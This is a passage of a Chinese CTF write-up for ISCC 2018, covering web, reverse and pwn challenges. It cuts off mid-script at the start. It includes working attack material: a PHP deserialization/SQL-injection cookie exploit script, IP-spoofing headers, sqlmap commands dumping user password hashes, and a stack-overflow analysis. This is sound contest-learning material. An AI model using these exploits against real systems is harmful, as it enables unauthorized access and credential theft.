@$_REQUEST[&apos;a&apos;]; </span><br><span class="line">@eval(&quot;var_dump($$a);&quot;); </span><br><span class="line">show_source(__FILE__); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>绕过即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">no_md5.php?a=flag</span><br><span class="line">ISCC&#123;a39f9a1ff7eb4bab8a6a21b2ce111b4&#125;</span><br></pre></td></tr></table></figure><h3 id="Only-Admin"><a href="#Only-Admin" class="headerlink" title="Only Admin"></a>Only Admin</h3><p>题目：听说只有admin可以看到flag？</p><p>最开始以为是利用MySQL的超长截断特性进行注册登陆，发现没成功。</p><p>扫描目录，发现有一个<a href="https://pan.baidu.com/s/1w0TI7ghbq0pwtLAs8w60ig" target="_blank" rel="noopener">web.zip</a>文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">web</span><br><span class="line">├─ .vscode</span><br><span class="line">│    └─ launch.json</span><br><span class="line">├─ MessageController.class.php</span><br><span class="line">├─ UserController.class.php</span><br><span class="line">├─ config.php  # 配置文件</span><br><span class="line">├─ index.php  # 登陆后主页</span><br><span class="line">├─ login.php  # 登陆页面</span><br><span class="line">├─ reg.php  # 注册页面</span><br><span class="line">├─ send.php</span><br><span class="line">└─ show.php</span><br></pre></td></tr></table></figure><p>审计，难受。 其实也就是带<code>cookie</code>访问的问题。</p><p>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">url=&quot;http://118.190.152.202:8020/&quot;</span><br><span class="line">def attack(url, payload):</span><br><span class="line">    s=requests.session()</span><br><span class="line">    u1 = url + &quot;send.php&quot;</span><br><span class="line">    plen = len(payload)</span><br><span class="line">    payload = &apos;a:2:&#123;s:5:&quot;email&quot;;O:7:&quot;Message&quot;:4:&#123;s:3:&quot;msg&quot;;s:&apos;+str(plen)+&apos;:&quot;&apos;+payload+&apos;&quot;;s:4:&quot;from&quot;;N;s:2:&quot;to&quot;;N;s:2:&quot;id&quot;;i:-1;&#125;s:8:&quot;password&quot;;s:5:&quot;23333&quot;;&#125;&apos;</span><br><span class="line">    cookies = &#123;&apos;ckSavePass&apos;: base64.b64encode(payload)&#125;</span><br><span class="line">    r = s.get(u1, cookies=cookies)</span><br><span class="line">    u2=&quot;http://118.190.152.202:8020/&quot; +&apos;config.php&apos;</span><br><span class="line">    r2=s.get(u2)</span><br><span class="line">    print r2.headers[&apos;Set-Cookie&apos;]</span><br><span class="line">    return False</span><br><span class="line">payload=&quot;111&apos; || 1=1 -- 111&quot;</span><br><span class="line">attack(url,payload)</span><br><span class="line">运行结果：</span><br><span class="line">csrftoken=zy129p1yvx; expires=Sun, 13-May-2018 15:47:38 GMT; Max-Age=3600; path=/, flag=flag&#123;USer1ali2e1sInt4rt1n9&#125;; expires=Sun, 13-May-2018 15:47:38 GMT; Max-Age=3600; path=/; httponly</span><br></pre></td></tr></table></figure><h3 id="为什么这么简单啊"><a href="#为什么这么简单啊" class="headerlink" title="为什么这么简单啊"></a>为什么这么简单啊</h3><p>进入，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一关</span><br><span class="line"></span><br><span class="line">第二关需要从 http://edu.xss.tv 进入，并且只有我公司的IP地址才可以进入第二关，公司IP为：110.110.110.110</span><br></pre></td></tr></table></figure><p>伪造IP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 118.190.152.202:8016</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Cookie: PHPSESSID=b604vp88ds9coh4352d3dncih2</span><br><span class="line">X-Forwarded-For: 110.110.110.110</span><br><span class="line">Referer: http://edu.xss.tv</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>进入到第二关，寻找密码。右键源码看到<code>password.js</code>，解密其中的base64，得到密码<code>xinyiji.com</code></p><p>flag：B1H3n5u0xI2n9JIscc</p><h3 id="Sqli"><a href="#Sqli" class="headerlink" title="Sqli"></a>Sqli</h3><p>在<code>username</code>存在延迟注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r post.txt --level 3 --tamper=space2comment --time-sec 6 -D &quot;sqli_database&quot; -T &quot;user&quot; -C &quot;username,pass&quot; --dump </span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: username (POST)</span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: username=%E2%80%98&apos; AND (SELECT * FROM (SELECT(SLEEP(5)))fbFG) AND &apos;xEit&apos;=&apos;xEit&amp;password=&apos;</span><br><span class="line">---</span><br><span class="line">[15:04:25] [WARNING] changes made by tampering scripts are not included in shown payload content(s)</span><br><span class="line">[15:04:25] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu</span><br><span class="line">web application technology: Apache 2.4.7, PHP 5.5.9</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">运行结果：</span><br><span class="line">Database: sqli_database</span><br><span class="line">Table: user</span><br><span class="line">[2 entries]</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">| username | pass                             |</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">| test     | 098f6bcd4621d373cade4e832627b4f6 |（test）</span><br><span class="line">| admin    | 197ed45182778e1c74cc8c72f9fffc07 |（u4g009）</span><br><span class="line">+----------+----------------------------------+</span><br></pre></td></tr></table></figure><p>登陆发现提示<code>flag在另一个字段</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r post.txt --level 3 --tamper=space2comment --time-sec 6 -D &quot;sqli_database&quot; -T &quot;news&quot; -C &quot;kjafuibafuohnuvwnruniguankacbh&quot; --dump</span><br><span class="line">运行结果：</span><br><span class="line">Database: sqli_database</span><br><span class="line">Table: news</span><br><span class="line">[1 entry]</span><br><span class="line">+--------------------------------+</span><br><span class="line">| kjafuibafuohnuvwnruniguankacbh |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| flag&#123;hahaha999999999&#125;          |</span><br><span class="line">+--------------------------------+</span><br></pre></td></tr></table></figure><h3 id="有种你来绕"><a href="#有种你来绕" class="headerlink" title="有种你来绕"></a>有种你来绕</h3><p>题目：我都过滤了，看你怎么绕。记住是mysql</p><p>只给了一个登录框，然后没了，那么尝试了一下admin, admin提示密码错误，再尝试了下其他的用户名密码，提示用户名错误，确定用户名就是admin</p><p>注入，过滤了<code>空格、#、*、union、like、regexp、and、or、|、–、&amp;、%0a、%0b、%0c、%0d</code>等，需要想办法用其他操作符连接注入语句和闭合’。</p><p>原文操作：<a href="https://blog.l1n3.net/writeup/swpu_ctf_2016_writeup/" target="_blank" rel="noopener">https://blog.l1n3.net/writeup/swpu_ctf_2016_writeup/</a></p><p>得出密码为<code>0416af0a8accf2be556a8e131438b814(nishishabi1438)</code></p><p>登陆之后和原题不一样了，直接填写<code>flag</code>就出现了flag值。</p><p>flag{sql_iNjEct_Is_Easy}</p><h2 id="0x03-Reverse"><a href="#0x03-Reverse" class="headerlink" title="0x03 Reverse"></a>0x03 Reverse</h2><h3 id="RSA256"><a href="#RSA256" class="headerlink" title="RSA256"></a>RSA256</h3><p>三个加密文件一个公钥。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">def ModExp(n, k, m):</span><br><span class="line">    a = list(bin(k))[2:]</span><br><span class="line">    a.reverse()</span><br><span class="line">    s = 1</span><br><span class="line">    for i in a:</span><br><span class="line">        if i == &apos;1&apos;:</span><br><span class="line">            s = (s * n) % m</span><br><span class="line">        n = (n * n) % m</span><br><span class="line">    return s</span><br><span class="line"></span><br><span class="line">n = int(&apos;D99E952296A6D960DFC2504ABA545B9442D60A7B9E930AFF451C78EC55D555EB&apos;, 16)</span><br><span class="line">print(&apos;n is&apos;)</span><br><span class="line">print(n)</span><br><span class="line">p = gmpy2.mpz(302825536744096741518546212761194311477)</span><br><span class="line">q = gmpy2.mpz(325045504186436346209877301320131277983)</span><br><span class="line">e = gmpy2.mpz(65537)</span><br><span class="line">phi_n = (p - 1) * (q - 1)</span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line">print(&quot;d is:&quot;)</span><br><span class="line">print(d)</span><br><span class="line">p = 302825536744096741518546212761194311477</span><br><span class="line">q = 325045504186436346209877301320131277983</span><br><span class="line">def ByteToHex( bins ):</span><br><span class="line">    return &apos;&apos;.join( [ &quot;%02X&quot; % x for x in bins ] ).strip()</span><br><span class="line"></span><br><span class="line">file1 = open(&quot;C:\\Users\\RcoIl\\Desktop\\fujian\\encrypted.message1&quot;, &apos;rb&apos;).read()</span><br><span class="line">c1 = int(ByteToHex(file1), 16)</span><br><span class="line">print(&quot;c1&quot;, c1)</span><br><span class="line">file2 = open(&quot;C:\\Users\\RcoIl\\Desktop\\fujian\\encrypted.message2&quot;, &apos;rb&apos;).read()</span><br><span class="line">c2 = int(ByteToHex(file2), 16)</span><br><span class="line">file3 = open(&quot;C:\\Users\\RcoIl\\Desktop\\fujian\\encrypted.message3&quot;, &apos;rb&apos;).read()</span><br><span class="line">c3 = int(ByteToHex(file3), 16)</span><br><span class="line">m = p * q</span><br><span class="line">flag1 = ModExp(c1, d, m)</span><br><span class="line">flag2 = ModExp(c2, d, m)</span><br><span class="line">flag3 = ModExp(c3, d, m)</span><br><span class="line">flag = &apos;0&apos; + hex(flag1)[2:] + &apos;0&apos; + hex(flag2)[2:] + &apos;0&apos; + hex(flag3)[2:]</span><br><span class="line">print(flag)</span><br><span class="line">i = 0</span><br><span class="line">result = &apos;&apos;</span><br><span class="line">for i in range(0, len(flag), 2):</span><br><span class="line">    result += chr((int(flag[i:i+2], 16)))</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><h3 id="My-math-is-bad"><a href="#My-math-is-bad" class="headerlink" title="My math is bad"></a>My math is bad</h3><p>程序地址：<a href="https://pan.baidu.com/s/10q1OftjPKjON15Ijs_RCdw" target="_blank" rel="noopener">My math is bad</a></p><p>题目：I think the math problem is too difficult for me.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file Reverse</span><br><span class="line">Reverse: ELF 64-bit LSB executable, x86-64, version  1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=20b7dc66633da72204852bf32a4e0c4ea46340b6, stripped</span><br></pre></td></tr></table></figure><p>IDA又是不显示main函数</p><p><img src="/image/ISCC-2018/Re2.png" alt=""></p><p>满足<code>sub_400766()</code>就输出<code>sub_400B16()</code>，那就，直接看<code>sub_400B16()</code> ？看了看，不行哦，捷径走不了，那就看<code>sub_400766()</code>里的东西。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">if ( strlen(s) == 32 )</span><br><span class="line">&#123;</span><br><span class="line">  v3 = unk_6020B0;</span><br><span class="line">  v4 = unk_6020B4;</span><br><span class="line">  v5 = unk_6020B8;</span><br><span class="line">  v6 = unk_6020BC;</span><br><span class="line">  result = 0;</span><br><span class="line">  if ( dword_6020A4 * (signed __int64)*(signed int *)s - dword_6020AC * (signed __int64)dword_6020A8 == 2652042832920173142LL</span><br><span class="line">    &amp;&amp; 3LL * dword_6020A8 + 4LL * dword_6020AC - dword_6020A4 - 2LL * *(signed int *)s == 397958918</span><br><span class="line">    &amp;&amp; 3 * *(signed int *)s * (signed __int64)dword_6020AC - dword_6020A8 * (signed __int64)dword_6020A4 == 3345692380376715070LL</span><br><span class="line">    &amp;&amp; 27LL * dword_6020A4 + *(signed int *)s - 11LL * dword_6020AC - dword_6020A8 == 40179413815LL )</span><br><span class="line">  &#123;</span><br><span class="line">    srand(dword_6020A8 ^ dword_6020A4 ^ *(_DWORD *)s ^ dword_6020AC);</span><br><span class="line">    v1 = rand() % 50;</span><br><span class="line">    v2 = rand() % 50;</span><br><span class="line">    v7 = rand() % 50;</span><br><span class="line">    v8 = rand() % 50;</span><br><span class="line">    v9 = rand() % 50;</span><br><span class="line">    v10 = rand() % 50;</span><br><span class="line">    v11 = rand() % 50;</span><br><span class="line">    v12 = rand() % 50;</span><br><span class="line">    if ( v6 * v2 + v3 * v1 - v4 - v5 == 61799700179LL</span><br><span class="line">      &amp;&amp; v6 + v3 + v5 * v8 - v4 * v7 == 48753725643LL</span><br><span class="line">      &amp;&amp; v3 * v9 + v4 * v10 - v5 - v6 == 59322698861LL</span><br><span class="line">      &amp;&amp; v5 * v12 + v3 - v4 - v6 * v11 == 51664230587LL )</span><br><span class="line">      result = 1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合动态分析，程序先判断输入值长度是否为32位，接下来将输入值进行拆分成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s、dword_6020A4、dword_6020A8、dword_6020AC、</span><br><span class="line">unk_6020B0(v3)、unk_6020B4(v4)、unk_6020B8(v5)、unk_6020BC(v6)</span><br></pre></td></tr></table></figure><p>依次验证，满足条件即返回1，则通过校验。</p><p>详细看看第8-13行，4个未知数和四个方程，emmm。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dword_6020A4 *s - dword_6020AC * dword_6020A8 == 2652042832920173142</span><br><span class="line">3 * dword_6020A8 + 4 * dword_6020AC - dword_6020A4 - 2 * s == 397958918</span><br><span class="line">3 * s * dword_6020AC - dword_6020A8 * dword_6020A4 == 3345692380376715070</span><br><span class="line">27 * dword_6020A4 + s - 11 * dword_6020AC - dword_6020A8 == 40179413815</span><br></pre></td></tr></table></figure><p>利用python的<code>z3</code>库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">dword_6020A4 = Int(&apos;dword_6020A4&apos;)</span><br><span class="line">dword_6020AC = Int(&apos;dword_6020AC&apos;)</span><br><span class="line">dword_6020A8 = Int(&apos;dword_6020A8&apos;)</span><br><span class="line">s = Int(&apos;s&apos;)</span><br><span class="line"></span><br><span class="line">solve(dword_6020A4 * s - dword_6020AC * dword_6020A8 == 2652042832920173142 ,</span><br><span class="line">    3 * dword_6020A8 + 4 * dword_6020AC - dword_6020A4 - 2 * s == 397958918 ,</span><br><span class="line">    3 * s * dword_6020AC - dword_6020A8 * dword_6020A4 == 3345692380376715070 ,</span><br><span class="line">    27 * dword_6020A4 +  s - 11 * dword_6020AC - dword_6020A8 == 40179413815 )</span><br><span class="line">运算结果：</span><br><span class="line">s = 1869639009</span><br><span class="line">dword_6020A4 = 1801073242</span><br><span class="line">dword_6020A8 = 829124174</span><br><span class="line">dword_6020AC = 862734414</span><br></pre></td></tr></table></figure><p>接下来到异或运算，直接用<code>C语言</code>吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int v1,v2,v7,v8,v9,v10,v11,v12;</span><br><span class="line"></span><br><span class="line">int main(void) &#123; </span><br><span class="line">srand(829124174 ^ 1801073242 ^ 1869639009 ^ 862734414);</span><br><span class="line">    v1 = rand() % 50;</span><br><span class="line">    v2 = rand() % 50;</span><br><span class="line">    v7 = rand() % 50;</span><br><span class="line">    v8 = rand() % 50;</span><br><span class="line">    v9 = rand() % 50;</span><br><span class="line">    v10 = rand() % 50;</span><br><span class="line">    v11 = rand() % 50;</span><br><span class="line">    v12 = rand() % 50;</span><br><span class="line">printf(&quot; v1=%d \n v2=%d \n V7=%d \n v8=%d \n v9=%d \n v10=%d \n v11=%d \n v12=%d&quot;,v1,v2,v7,v8,v9,v10,v11,v12);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">运算结果：</span><br><span class="line">v1=22 </span><br><span class="line">v2=39 </span><br><span class="line">V7=45 </span><br><span class="line">v8=45 </span><br><span class="line">v9=35 </span><br><span class="line">v10=41 </span><br><span class="line">v11=13 </span><br><span class="line">v12=36</span><br></pre></td></tr></table></figure><p>然后继续接下来的方程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">v3 = Int(&apos;v3&apos;)</span><br><span class="line">v4 = Int(&apos;v4&apos;)</span><br><span class="line">v5 = Int(&apos;v5&apos;)</span><br><span class="line">v6 = Int(&apos;v6&apos;)</span><br><span class="line"></span><br><span class="line">solve(v6 * 39 + v3 * 22 - v4 - v5 == 61799700179,</span><br><span class="line">v6 + v3 + v5 * 45 - v4 * 45 == 48753725643,</span><br><span class="line">v3 * 35 + v4 * 41 - v5 - v6 == 59322698861,</span><br><span class="line">v5 * 36 + v3 - v4 - v6 * 13 == 51664230587,)</span><br><span class="line">运算结果：</span><br><span class="line">v3 = 811816014</span><br><span class="line">v4 = 828593230</span><br><span class="line">v5 = 1867395930</span><br><span class="line">v6 = 1195788129</span><br></pre></td></tr></table></figure><p>将数字串转换成字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">import libnum</span><br><span class="line"></span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">x = [1869639009,1801073242,829124174,862734414,811816014,828593230,1867395930,1195788129]</span><br><span class="line">for y in x:</span><br><span class="line">    flag += libnum.n2s(y)[::-1]</span><br><span class="line">    print flag</span><br><span class="line">运算结果：</span><br><span class="line">ampoZ2ZkNnk1NHl3NTc0NTc1Z3NoaGFG</span><br></pre></td></tr></table></figure><p>得出正确的输入值，输入输出</p><p><img src="/image/ISCC-2018/Re2-1.png" alt=""></p><h2 id="0x04-PWN"><a href="#0x04-PWN" class="headerlink" title="0x04 PWN"></a>0x04 PWN</h2><h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>题目：nc 47.104.16.75 9000</p><p>程序地址：<a href="https://pan.baidu.com/s/1fcY68iZ-gZqyF9x-njScKA" target="_blank" rel="noopener">Pwn-Login</a></p><p>下载附件倒入<code>IDA</code>进行分析</p><p>程序运行过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main()--&gt;Login()--&gt;Menu()--&gt;ExecCmd()--&gt;ShowUserlist()...</span><br></pre></td></tr></table></figure><p>查看<code>Login()</code>内容，总的看没什么特别的，接下来看<code>Menu()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax@6</span><br><span class="line">  char buf[68]; // [sp+0h] [bp-50h]@1</span><br><span class="line">  int v2; // [sp+44h] [bp-Ch]@2</span><br><span class="line">  __int64 v3; // [sp+48h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  memset(buf, 0, 0x40uLL);</span><br><span class="line">  v3 = 0LL;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;\nPanel\n\n1. exec command\n2. show user list\n3. exit\n&quot;);</span><br><span class="line">        printf(&quot;Your choice: &quot;);</span><br><span class="line">        fflush(_bss_start);</span><br><span class="line">        v2 = read(0, buf, 0x280uLL);</span><br><span class="line">        buf[v2] = 0;</span><br><span class="line">        if ( buf[0] != 49 )</span><br><span class="line">          break;</span><br><span class="line">        ExecCmd();</span><br><span class="line">      &#125;</span><br><span class="line">      if ( buf[0] != 50 )</span><br><span class="line">        break;</span><br><span class="line">      ShowUserlist(0LL, buf);</span><br><span class="line">    &#125;</span><br><span class="line">    result = (unsigned __int8)buf[0];</span><br><span class="line">  &#125;</span><br><span class="line">  while ( buf[0] != 51 );</span><br><span class="line">  return result;</span><br></pre></td></tr></table></figure><p>注意看第18行的代码。非常简单，单纯的读取一串字符串，然后储存在<code>buf</code>里面，但是，开辟的缓存区只有<code>0x50</code>字节大小，但是<code>read</code>最多可以读取<code>0x280</code>字节大小，这样就会造成缓存区溢出，也就是栈溢出漏洞。</p><p>接下来再看<code>ExecCmd()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">int ExecCmd()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax@2</span><br><span class="line">  char *v1; // [sp+0h] [bp-10h]@3</span><br><span class="line"></span><br><span class="line">  if ( !strcmp(strUsername, &quot;admin&quot;) ) //判断是否为admin用户</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Command: &quot;, &quot;admin&quot;, 0LL);</span><br><span class="line">    fflush(_bss_start);</span><br><span class="line">    fgets(cmd, 255, stdin);</span><br><span class="line">    v1 = strchr(cmd, 10);</span><br><span class="line">    if ( v1 )</span><br><span class="line">      *v1 = 0;</span><br><span class="line">    result = puts(&quot;Sorry, this feature has been disabled.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    result = puts(&quot;Sorry, this feature is only available for admin&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们要做的：如下图，程序不经过红框内，直接跳过输出。</p><p><img src="/image/ISCC-2018/Pwn1.png" alt=""></p><p>也就是将<code>return</code>修改到<code>call system</code>，记住交互的最后还得输入一个3退出while循环</p><p>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = 